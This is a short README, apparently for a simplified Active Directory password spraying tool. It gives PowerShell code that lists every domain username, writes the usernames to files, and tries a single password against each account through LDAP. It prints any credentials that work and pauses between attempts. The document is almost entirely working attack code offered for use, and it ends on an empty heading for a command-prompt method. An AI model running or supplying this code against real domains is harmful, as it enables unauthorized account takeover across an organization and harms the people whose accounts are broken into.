# DomainPasswordSprayLight

Kudos to Beau Bullocks [Domain Password Spray script](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) of which this is a simplification.

## Gather Domain Usernames

Run the following to get a PowerShell object called $AllUserObjects that you can interact with to sort, filter and write seletected usernames to a file of your choosing.

```PowerShell
$UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
$DirEntry = New-Object System.DirectoryServices.DirectoryEntry
$UserSearcher.SearchRoot = $DirEntry
$UserSearcher.PropertiesToLoad.Add("samaccountname") | Out-Null
$Filter = ""
$UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)$Filter)"
$UserSearcher.PageSize = 1000

Write-Host -ForegroundColor Cyan "Searching for all users, that may take several minutes."
$AllUserObjects = $UserSearcher.FindAll()
Write-Host -ForegroundColor "yellow" ("[*] " + $AllUserObjects.count + " total users found.")
```

### Write all usernames to a file

```PowerShell
$outfile = "all-user.txt"
Remove-Item $outfile -ErrorAction Ignore
$AllUserObjects.Properties.samaccountname | add-content $outfile
```

### Write specific users to a file

In this example, the usernames are limited to only those that start with "ab"

```PowerShell
$outfile =  "all-ab-accounts.txt" 
Remove-Item $outfile -ErrorAction Ignore
($AllUserObjects | where-object {$_.Properties.samaccountname -like  "ab*"}).Properties.samaccountname | add-content $outfile
```
## Password Spray with PowerShell

```PowerShell
function Invoke-dpsLight ($Password, $userlist) {
    $users = Get-Content $userlist
    $Domain = "LDAP://" + ([ADSI]"").distinguishedName
    $count = 0
    foreach ($User in $users) {
        $count = $count + 1
        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
        if ($Domain_check.name -ne $null) {
            Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
        }
        else {
            Write-Host "$count`:$User " -NoNewline
            start-sleep -milliseconds 300
        }
    }
    Write-Host -ForegroundColor green "Finished"
}
```

## Password Spray from the Command Prompt

This method using a different method which generates different Windows event IDs. It is also much slower.

